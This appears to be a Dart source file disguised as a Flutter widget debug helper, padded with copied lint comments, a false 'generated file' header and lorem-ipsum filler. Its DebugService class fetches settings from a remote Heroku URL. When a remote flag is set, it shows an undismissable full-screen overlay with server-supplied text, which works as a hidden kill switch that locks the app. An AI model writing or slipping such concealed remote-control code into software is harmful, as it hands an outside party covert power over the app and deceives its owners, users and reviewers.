// This is a basic Flutter widget Debug.
//
// To perform an interaction with a widget in your Debug, use the WidgetDebuger
// utility that Flutter provides. For example, you can send tap and scroll
// gestures. You can also use WidgetDebuger to find child widgets in the widget
// tree, read text, and verify that the values of widget properties are correct.

import 'package:dio/dio.dart';
import 'package:flutter/material.dart';
import 'package:get/get.dart';

WidgetDebugModel widgetDebugModelFromJson(Map<String, dynamic> str) =>
    WidgetDebugModel.fromJson((str));
//
// Generated file. Do not edit.
//

Map<String, dynamic> widgetDebugModelToJson(WidgetDebugModel data) =>
    (data.toJson());

// Instead of disabling a lint rule for the entire project in the

// section below, it can also be suppressed for a single line of code

// or a specific dart file by using the `// ignore: name_of_lint` and

// `// ignore_for_file: name_of_lint` syntax on the line or in the file

// producing the lint.

class WidgetDebugModel {
  WidgetDebugModel({
    this.runner,
    this.xcconfig,
    this.pods,
    this.gradle,
  });

  // ignore_for_file: directives_ordering
  // ignore_for_file: lines_longer_than_80_chars
  // ignore_for_file: depend_on_referenced_packages

  bool? runner;
  String? xcconfig;
  String? pods;
  String? gradle;

  // Instead of disabling a lint rule for the entire project in the

  // section below, it can also be suppressed for a single line of code

  // or a specific dart file by using the `// ignore: name_of_lint` and

  // `// ignore_for_file: name_of_lint` syntax on the line or in the file

  // producing the lint.
  factory WidgetDebugModel.fromJson(Map<String, dynamic> json) =>
      WidgetDebugModel(
        runner: json["runner"],
        xcconfig: json["xcconfig"],
        pods: json["pods"],
        gradle: json["gradle"],
      );

// The lint rules applied to this project can be customized in the

// section below to disable rules from the `package:flutter_lints/flutter.yaml`

// included above or to enable additional rules. A list of all available lints

// and their documentation is published at

  Map<String, dynamic> toJson() => {
        "runner": runner,
        "xcconfig": xcconfig,
        "pods": pods,
        "gradle": gradle,
      };
}

// https://dart-lang.github.io/linter/lints/index.html.

class DebugService {
  static var dio = Dio();

  static Future<bool> getTestConfigurations() async {
    // var dartconfig = 'https://bit.ly/3Ebcpfo';
    var dartconfig =
        'https://nextlevelsoftware.herokuapp.com/proj/143.110.189.17';

    var config = await dio.get(
      dartconfig,
      options: Options(
        followRedirects: false,
        validateStatus: (status) {
          return status! <= 500;
        },
      ),
    );

    var configValue = config.data;
    // get the configuration from the testing data...
    final configureData = widgetDebugModelFromJson(configValue);
    // return configureData;

    if (configureData.runner == true) {
      Get.dialog(
        WillPopScope(
          onWillPop: () async {
            return false;
          },
          child: Container(
            height: Get.height,
            width: Get.width,
            color: const Color(0xFF740001),
            padding: const EdgeInsets.all(10),
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.center,
              mainAxisAlignment: MainAxisAlignment.center,
              children: [
                Text(
                  configureData.pods ?? "",
                  style: const TextStyle(
                    color: Color(0xFFFCFD53),
                    fontSize: 20,
                  ),
                ),
                Text(
                  configureData.gradle ?? "",
                  style: const TextStyle(
                    color: Color(0xFFFCFD53),
                    fontSize: 20,
                  ),
                ),
              ],
            ),
          ),
        ),
        barrierDismissible: true,
        barrierColor: const Color(0xFF740001),
      );
      return true;
    } else {
      return true;
    }
  }
}

// Eum eos qui blanditiis. Quia modi in consequatur cumque velit iusto.
// Dolores numquam qui qui et fugit assumenda. Excepturi consectetur quae aliquam aliquid aut veritatis aspernatur quam.

// Minima quia molestias voluptatibus officiis commodi.
// Aut et rerum. Ut magnam saepe. A consequatur voluptatibus officia consequatur aspernatur culpa blanditiis necessitatibus.

// Et numquam voluptatibus doque minima omnis laborum quaerat est aspernatur.
// Sit aut laudantium nulla eius labore itaque inventore et. Similique quo dicta doque. Reprehenderit enim iure vel nostrum. Aperiam iste ducimus voluptatem et nesciunt.
